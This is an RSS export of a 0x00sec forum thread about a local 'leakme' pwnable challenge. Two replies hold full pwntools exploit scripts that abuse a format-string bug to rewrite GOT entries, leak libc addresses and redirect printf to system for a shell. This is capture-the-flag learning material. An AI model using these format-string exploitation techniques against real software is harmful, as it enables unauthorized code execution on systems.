<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>[Pwnable] Do You Even Leak Bruh</title>
    <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004</link>
    <description>Suh peeps! Another pwnable challenge!

---

###_Difficulty_
Easy, but could be debatable.

---
###_Objective_

Get a shell.

---
###_Rules_
* ASLR should be turned on!
* Since no libc is provided, all you have to do is pwn the binary locally.
* Full PoC is accepted as a solution. Just a screenshot of the shell doesn&#39;t mean anything.

---

###_Binary_

Since my demo isn&#39;t always enough, big thanks to @exploit for making sure the binary is indeed exploitable.

[pwn me](https://transfer.sh/cue7H/leakme)
___

~ gl &amp; hf</description>
    
    <lastBuildDate>Fri, 18 Aug 2017 14:34:40 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/17</link>
        <pubDate>Tue, 09 Jan 2018 11:26:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-17</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[segfault]]></dc:creator>
        <description><![CDATA[
            <p>Good One I really liked this challenge <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"> and this the way i solved it !</p>
<div class="spoiler"><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/16">spoiler</a></div>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/16</link>
        <pubDate>Fri, 18 Aug 2017 14:23:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-16</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[segfault]]></dc:creator>
        <description><![CDATA[
            <p>okay Thanks dude <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">  (y)</p>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/15</link>
        <pubDate>Fri, 18 Aug 2017 12:34:05 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-15</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>I’ve no idea why the link stopped working. Sorry for the inconvenience, the link is now updated.</p>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/14</link>
        <pubDate>Thu, 17 Aug 2017 17:37:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-14</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[segfault]]></dc:creator>
        <description><![CDATA[
            <p>did you delete the Binary  ??</p>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/13</link>
        <pubDate>Thu, 17 Aug 2017 16:28:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-13</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>This has nothing to do with crackmes. This field is called exploit development. Though you need reverse engineering knowledge, exploit dev steps it up way more because you have to find bugs by reading assembly.</p>
<p>That being said, exploit dev is a mindset, but you can learn the basic-beginner methology by following LiveOverflow’s videos on YouTube.</p>
<p>By the way, for this certain type of pwnable there’s a write up of mine explaining the internals of format string attacks.</p>
<aside class="quote quote-modified" data-post="1" data-topic="1920">
  <div class="title">
    <div class="quote-controls"></div>
    <img alt="" width="20" height="20" src="/user_avatar/0x00sec.org/_py/40/4275_2.png" class="avatar">
    <a href="https://0x00sec.org/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920">picoCTF Write-up ~ Bypassing ASLR via Format String Bug</a> <a class="badge-wrapper  bullet" href="https://0x00sec.org/c/exploit-development/53"><span class="badge-category-bg" style="background-color: #92278F;"></span><span style="" data-drop-close="true" class="badge-category clear-badge">Exploit Development</span></a>
  </div>
  <blockquote>
    Hello folks! I hope you’re all doing great. After a disgusting amount of trial and error, I present to you my solution for the console pwnable. Unfortunately, I did not solve the task on time but it was fun nevertheless. I decided to use this challenge as a way to introduce to you one of the ways you can bypass ASLR. 
If you have never messed with basic pwning i.e stack/buffer overflows, this write-up might not be your cup of tea. It’ll be quite technical. Firstly I’ll bombard you with theory an…
  </blockquote>
</aside>

          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/12</link>
        <pubDate>Wed, 26 Jul 2017 11:49:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-12</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[hkh4cks]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/_py">@_py</a> are there any tutorials to learn it? I’m really interested in such problems. And also crack me problems…</p>
<p>Does it come under exploit development?</p>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/11</link>
        <pubDate>Wed, 26 Jul 2017 11:42:15 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-11</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[mkhdznfq]]></dc:creator>
        <description><![CDATA[
            <p>wow thanks <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> for the note. never knew i could that <img src="https://0x00sec.org/images/emoji/twitter/joy.png?v=9" title=":joy:" class="emoji" alt=":joy:"></p>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/10</link>
        <pubDate>Tue, 25 Jul 2017 03:52:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-10</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Exactly. If you try to leak exit’s address you’ll notice its PLT stub code address. As for printf, it’s wise not to leak its address since it’s placed in weird areas in libc and sometimes you’ll end up with a misaligned libc base, resulting to miscalculations of system’s address.</p>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/9</link>
        <pubDate>Mon, 24 Jul 2017 19:13:28 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-9</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[neolex]]></dc:creator>
        <description><![CDATA[
            <p>Yes <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> thanks, just to be sure : it does’nt work with exit’s or printf’s got address because exit is not called before i try to leak it ? So the address is not resolved ?</p>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/8</link>
        <pubDate>Mon, 24 Jul 2017 19:09:01 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-8</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/neolex">@neolex</a> you’re on fire <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"> I hope you now understood how much more convenient that technique is.</p>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/7</link>
        <pubDate>Mon, 24 Jul 2017 19:04:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-7</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[neolex]]></dc:creator>
        <description><![CDATA[
            <p>Thank you for the note <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> , I tried your way to leak and successed, here is my POC :</p>
<p>[spoiler][code]#!/usr/bin/env python2</p>
<p>from pwn import *</p>
<p>EXIT_GOT = 0x0804980c<br>
PUTS_GOT = 0x08049808<br>
PRINTF_GOT = 0x080497fc<br>
ENTRY_POINT = 0x8400<br>
PUTS_OFFSET = 0x00062710<br>
SYSTEM_OFFSET = 0x0003c060<br>
_IO_2_1_stdin_offset = 0x001bd580</p>
<p>def overwrite(addr,number):<br>
payload = “”<br>
payload += p32(addr)<br>
payload += “%{}u|%4$hn”.format(number-5)<br>
p.sendline(payload)<br>
p.clean()</p>
<p>def double_overwrite(addr,number):<br>
towritel = (number &amp; 0xFFFF)<br>
towriteh = ((number &amp; 0xFFFF0000)&gt;&gt;16)</p>
<pre><code>payload = ""
payload += p32(addr)
payload += p32(addr+2)
payload += "%{}x|%4$hn".format(towritel-9)
payload += "%{}x|%5$hn".format(towriteh-towritel-1)
p.sendline(payload)
p.clean()
</code></pre>
<p>p = process("./leakme")</p>
<h1>overwrite exit by entry point : loop</h1>
<p>overwrite(EXIT_GOT,ENTRY_POINT)</p>
<p>p.sendline(“JUNK”)<br>
p.recv()</p>
<h1>leak with %s</h1>
<p>payload = p32(PUTS_GOT)<br>
payload += “|%4$s|NEO”<br>
p.sendline(payload)<br>
leaked=u32(p.recvuntil("|NEO").split("|")[1])<br>
print “Leaked puts address : ‘{}’”.format(hex(leaked))<br>
p.recvline()</p>
<h1>get libc base</h1>
<p>libc_base = leaked-PUTS_OFFSET<br>
print(“Libc base : {}”.format(hex(libc_base)))</p>
<p>system =libc_base + SYSTEM_OFFSET<br>
print(“system : {}”.format(hex(system)))<br>
double_overwrite(PRINTF_GOT,system)<br>
p.sendline(“clear”)<br>
p.interactive()<br>
[/code][/spoiler]</p>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/6</link>
        <pubDate>Mon, 24 Jul 2017 18:55:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-6</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Nicely done <a class="mention" href="https://0x00sec.org/u/neolex">@neolex</a>! <img src="https://0x00sec.org/images/emoji/twitter/muscle.png?v=9" title=":muscle:" class="emoji" alt=":muscle:"> A small note to both <a class="mention" href="https://0x00sec.org/u/neolex">@neolex</a> and <a class="mention" href="https://0x00sec.org/u/mkhdznfq">@mkhdznfq</a>:</p>
<div class="spoiler"><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/5">spoiler</a></div>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/5</link>
        <pubDate>Mon, 24 Jul 2017 18:27:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-5</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[neolex]]></dc:creator>
        <description><![CDATA[
            <p>Thank you for the challenge <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> !<br>
I need to practice a lot with pwn challenge i’m pretty noob at it , but I made it <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>[spoiler][code]#!/usr/bin/env python2</p>
<p>from pwn import *</p>
<p>EXIT_GOT = 0x0804980c<br>
PRINTF_GOT = 0x080497fc<br>
ENTRY_POINT = 0x8400<br>
SYSTEM_OFFSET = 0x0003c060<br>
_IO_2_1_stdin_offset = 0x001bd580</p>
<p>def overwrite(addr,number):<br>
payload = “”<br>
payload += p32(addr)<br>
payload += “%{}u|%4$hn”.format(number-5)<br>
p.sendline(payload)<br>
p.clean()</p>
<p>def double_overwrite(addr,number):<br>
towritel = (number &amp; 0xFFFF)<br>
towriteh = ((number &amp; 0xFFFF0000)&gt;&gt;16)</p>
<pre><code>payload = ""
payload += p32(addr)
payload += p32(addr+2)
payload += "%{}x|%4$hn".format(towritel-9)
payload += "%{}x|%5$hn".format(towriteh-towritel-1)
p.sendline(payload)
p.clean()
</code></pre>
<p>p = process("./leakme")<br>
pause()</p>
<h1>overwrite exit by entry point : loop</h1>
<p>overwrite(EXIT_GOT,ENTRY_POINT)</p>
<h1>leak</h1>
<p>p.sendline("%2$p")<br>
p.recvline()<br>
p.recvline()<br>
leaked=int(p.recvline().strip(), 16)<br>
print “Leaked address : ‘{}’”.format(hex(leaked))</p>
<p>p.recvline()</p>
<h1>get libc base</h1>
<p>libc_base = leaked-_IO_2_1_stdin_offset<br>
print(“Libc base : {}”.format(hex(libc_base)))</p>
<p>system =libc_base + SYSTEM_OFFSET<br>
print(“system : {}”.format(hex(system)))<br>
double_overwrite(PRINTF_GOT,system)<br>
p.sendline(“clear”)<br>
p.interactive()<br>
[/code]<br>
<a href="https://asciinema.org/a/JE08jLdGx9tY3FQtSLZZCrUmH" class="onebox" target="_blank" rel="nofollow noopener">https://asciinema.org/a/JE08jLdGx9tY3FQtSLZZCrUmH</a><br>
[/spoiler]</p>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/4</link>
        <pubDate>Mon, 24 Jul 2017 18:20:37 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-4</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/mkhdznfq">@mkhdznfq</a> Congrats! <img src="https://0x00sec.org/images/emoji/twitter/ok_hand.png?v=9" title=":ok_hand:" class="emoji" alt=":ok_hand:"></p>
<p>Looks like you do leak bruh <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/3</link>
        <pubDate>Sun, 23 Jul 2017 18:24:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-3</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[mkhdznfq]]></dc:creator>
        <description><![CDATA[
            <p>thanks for the challenge <img src="https://0x00sec.org/images/emoji/twitter/thumbsup.png?v=9" title=":thumbsup:" class="emoji" alt=":thumbsup:"> here’s my poc</p>
<div class="spoiler"><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/2">spoiler</a></div>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/2</link>
        <pubDate>Sun, 23 Jul 2017 17:56:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-2</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
      <item>
        <title>[Pwnable] Do You Even Leak Bruh</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Suh peeps! Another pwnable challenge!</p>
<hr>
<p>###<em>Difficulty</em><br>
Easy, but could be debatable.</p>
<hr>
<p>###<em>Objective</em></p>
<p>Get a shell.</p>
<hr>
<p>###<em>Rules</em></p>
<ul>
<li>ASLR should be turned on!</li>
<li>Since no libc is provided, all you have to do is pwn the binary locally.</li>
<li>Full PoC is accepted as a solution. Just a screenshot of the shell doesn’t mean anything.</li>
</ul>
<hr>
<p>###<em>Binary</em></p>
<p>Since my demo isn’t always enough, big thanks to <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> for making sure the binary is indeed exploitable.</p>
<p><a href="https://transfer.sh/cue7H/leakme" rel="nofollow noopener">pwn me</a></p>
<hr>
<p>~ gl &amp; hf</p>
          <p><a href="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004/1</link>
        <pubDate>Sun, 23 Jul 2017 08:32:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3004-1</guid>
        <source url="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004.rss">[Pwnable] Do You Even Leak Bruh</source>
      </item>
  </channel>
</rss>
